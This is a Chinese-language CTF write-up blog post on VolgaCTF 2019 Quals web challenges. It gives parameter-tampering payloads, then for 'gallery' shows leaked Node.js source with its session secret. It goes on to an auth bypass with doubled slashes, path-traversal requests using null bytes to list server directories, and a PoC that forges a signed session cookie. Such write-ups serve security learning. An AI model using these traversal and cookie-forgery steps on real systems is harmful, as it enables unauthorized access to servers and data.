<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>VolgaCTF 2019 Quals · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">VolgaCTF 2019 Quals</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-03</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="VolgaCTF-2019-Quals"><a href="#VolgaCTF-2019-Quals" class="headerlink" title="VolgaCTF 2019 Quals"></a>VolgaCTF 2019 Quals</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>payload:<code>&amp;balance=2000</code></p>
<h2 id="shop2"><a href="#shop2" class="headerlink" title="shop2"></a>shop2</h2><p>payload:<code>name=ausername&amp;CartItems[0].id=4</code></p>
<h2 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h2><p>先使用<strong>SourceLeakHacker</strong>这个脚本爆目录，发现无法得到正常返回结果，看了writeup，发现了<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>这个东西</p>
<blockquote>
<p>用法：./dirsearch.py -u url</p>
</blockquote>
<p>发现了一些js文件<br><strong>main.js</strong></p>
<pre><code>  $(document).ready(function() {
year = parseInt(location.pathname.slice(1)) || 2018;
$.getJSON(`/api/images?year=${year}`, function(data) {
  $.each(data, function(key, img) {

$(&apos;&lt;div&gt;&apos;, {
class: &apos;col-lg-3 col-md-4 col-xs-6&apos;,
html: $(&apos;&lt;a&gt;&apos;, {
  href: `/api/image?year=${year}&amp;img=${img}`,
  class: &apos;d-block mb-4 h-100&apos;,
  html: $(&apos;&lt;img&gt;&apos;, {
class: &apos;img-fluid img-thumbnail&apos;,
src: `/api/image?year=${year}&amp;img=${img}`,
alt: &apos;&apos;
  })
})
 }).appendTo($(&apos;#gallery&apos;));;
  });
}).fail(function() { location = &apos;/login&apos;;});
  });
</code></pre><p><strong>index.js</strong></p>
<pre><code>const express= require(&apos;express&apos;);
const session = require(&apos;express-session&apos;);
const store = require(&apos;session-file-store&apos;)(session);
const proxy = require(&apos;http-proxy-middleware&apos;);
const parser = require(&apos;body-parser&apos;);
const fs = require(&apos;fs&apos;);
const app = express();

config = require(&apos;./config&apos;);
auth = require(&apos;./auth&apos;)();
config.session.store = new store();

app.use(parser.urlencoded({ extended: false }));
app.use(`${config.apiPrefix}/*`, session(config.session));
app.use(`${config.apiPrefix}/*`, auth.unless({path: config.whitelistPaths}));

app.post(`${config.apiPrefix}/login`, function (req, res) {
    /* TODO: Implement login*/
    res.redirect(&apos;/login&apos;);
});

app.get(`${config.apiPrefix}/logout`, function (req, res) {
    /* TODO: Implement logout */
    res.redirect(&apos;/login&apos;);
});

app.get(`${config.apiPrefix}/flag`, function (req, res) {
    console.log(req.session);
    if(req.session.name === &apos;admin&apos;)
        res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
    else
        res.status(403).send();
});

app.use(proxy(config.proxy));
app.listen(config.server.port);
</code></pre><p><strong>config.js</strong></p>
<pre><code>const config = {
  apiPrefix: &apos;/api&apos;,
  server: {
port: 4000
  },
  proxy: {
target: &apos;http://localhost:5000&apos;,
autoRewrite: true
  },
  session: {
name: &apos;SESSION&apos;,
saveUninitialized: false,
secret: &apos;;GmU1FSlVETF/vzEaBHP&apos;,
rolling: true,
resave: false
  },
  whitelistPaths: [
&apos;/api/login&apos;, &apos;/api/logout&apos;
  ]
}

module.exports = config;
</code></pre><p><strong>auth.js</strong></p>
<pre><code>const unless = require(&apos;express-unless&apos;);

const auth = function () {
  var authm = function (req, res, next) {
    console.log(req.session);
if (!req.session.name) {
    res.status(403).send();
} else {
        next();
}
  }
  authm.unless = unless;
  return authm;
};

module.exports = auth;
</code></pre><p>基于node.js的服务端<br>这里要涉及到<strong>wget</strong>相关命令，它可以下载网站目录的文件，几个常用指令</p>
<blockquote>
<p>-c 断点续传</p>
<p>-r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件</p>
<p>-nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录</p>
<p>-np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/ 没有加参数-np，就会同时下载path的上一级目录pub下的其它文件</p>
<p>-k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数</p>
<p>-L 递归时不进入其它主机，如wget -c -r www.xxx.org/ 如果网站内有一个这样的链接： www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</p>
<p>-p 下载网页所需的所有文件，如图片等 -A 指定要下载的文件样式列表，多个样式用逗号分隔 -i 后面跟一个文件，文件内指明要下载的URL</p>
<p>-P 保存到指定目录</p>
</blockquote>
<p>config.js将session存储到本地服务器，似乎无法拿到，从index.js来看：</p>
<pre><code>app.get(`${config.apiPrefix}/flag`, function (req, res) {
console.log(req.session);
if(req.session.name === &apos;admin&apos;)
res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
else
res.status(403).send();
});
</code></pre><p>session要认证为admin，但似乎无法伪造，于是将目标转到接口，但<code>api/login</code>和<code>api/logout</code>都没什么可利用的，参考了writeup，提到了一种请求方式：<strong>options request</strong>，有如下解释：</p>
<blockquote>
<p>HTTP 的 OPTIONS 方法 用于获取目的资源所支持的通信选项。客户端可以对特定的 URL 使用 OPTIONS 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。</p>
<p>语法：<br>OPTIONS /index.html HTTP/1.1<br>OPTIONS * HTTP/1.1</p>
<p>在 CORS 中，可以使用 OPTIONS 方法发起一个预检请求，以检测实际请求是否可以被服务器所接受。预检请求报文中的 Access-Control-Request-Method 首部字段告知服务器实际请求所使用的 HTTP 方法；Access-Control-Request-Headers 首部字段告知服务器实际请求所携带的自定义首部字段。服务器基于从预检请求获得的信息来判断，是否接受接下来的实际请求。</p>
</blockquote>
<p>发送如下请求：</p>
<pre><code>OPTIONS /api/logout HTTP/1.1
Host: gallery.q.2019.volgactf.ru
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre><p>回显了报错信息：<br><img src="https://i.imgur.com/oSv3xxo.png" alt=""></p>
<p>laravel框架，访问<code>/api/image</code>出现403，考虑<a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001" target="_blank" rel="noopener">bypass</a>)，这里因为没有对路径访问做过滤，所以可以直接<code>//</code>或者多个<code>/</code>的方式进行绕过，于是<code>GET //api/images HTTP/1.1</code>，成功回显了一个空数组，因为没有传参</p>
<p>当<code>GET //api/images/?year=2019 HTTP/1.1</code>，再次报错<br><img src="https://i.imgur.com/4Dy031e.png" alt=""></p>
<ul>
<li>既然<strong>/2019/img</strong>，也就是说可以控制路径访问任意，验证猜想：<code>GET //api/images?year=2018%00 HTTP/1.1</code>，response返回<code>[&quot;img&quot;]</code></li>
</ul>
<ul>
<li>继续<code>GET //api/images?year=2018/../../../../../../../var/www%00</code>，response返回<code>[&quot;html&quot;,&quot;flag&quot;,&quot;apps&quot;]</code></li>
</ul>
<ul>
<li><p>尝试直接读取<code>GET //api/image?year=2018/../../../../../../../var/www/%00&amp;img=../flag HTTP/1.1</code>，然而报错：<br><img src="https://i.imgur.com/yo4cAtq.png" alt=""></p>
</li>
<li><p>所以转而尝试读取<code>GET //api/images?year=2018/../../../../../../../var/www/html%00 HTTP/1.1</code>，response为<code>[&quot;index.html&quot;]</code>，无用</p>
</li>
</ul>
<ul>
<li>访问<code>GET //api/images?year=2018/../../../../../../../var/www/apps%00 HTTP/1.1</code>，response为<code>[&quot;volga_gallery&quot;,&quot;volga_adminpanel&quot;,&quot;volga_auth&quot;]</code></li>
</ul>
<ul>
<li>继续<code>GET //api/images?year=2018/../../../../../../../var/www/apps/volga_adminpanel%00 HTTP/1.1</code>，response为<code>[&quot;sessions&quot;,&quot;app.js&quot;]</code>，这里可以猜想，获取到sessions中的值就可以伪造为admin</li>
</ul>
<ul>
<li>于是继续访问<code>GET //api/images?year=2018/../../../../../../../var/www/apps/volga_adminpanel/sessions%00 HTTP/1.1</code>，response为<code>[&quot;euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json&quot;]</code><br>关键的一点，如何构造session，我们有了secret，那么可以尝试自己在本地构造<br>先安装<code>npm install express-session</code></li>
</ul>
<p>poc：</p>
<pre><code>var cookie = require(&apos;cookie-signature&apos;);
var val = cookie.sign(unescape(&apos;../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM&apos;), &apos;;GmU1FSlVETF/vzEaBHP&apos;);
console.log(&apos;Cookie: SESSION=s:&apos;+val);
</code></pre><p>得到session：<code>Cookie: SESSION=s:../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB/J4sPnVj5QkDEuBu/0QelFQQqAV6yh4</code></p>
<p><strong>reference:</strong><br><a href="https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals" target="_blank" rel="noopener">https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/04/03/CTF/VolgaCTF 2019(web)/">http://microvorld.com/2019/04/03/CTF/VolgaCTF 2019(web)/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/08/CTF/MidnightSun CTF 2019/" title="MidnightSun CTF 2019"><span>< PreviousPost</span><br><span class="prevTitle">MidnightSun CTF 2019</span></a><a class="nextSlogan" href="/2019/04/01/CTF/fireshell ctf(vice)/" title="fireshell ctf2019 vice"><span>NextPost ></span><br><span class="nextTitle">fireshell ctf2019 vice</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VolgaCTF-2019-Quals"><span class="toc-number">1.</span> <span class="toc-text">VolgaCTF 2019 Quals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-number">1.1.</span> <span class="toc-text">shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shop2"><span class="toc-number">1.2.</span> <span class="toc-text">shop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gallery"><span class="toc-number">1.3.</span> <span class="toc-text">gallery</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>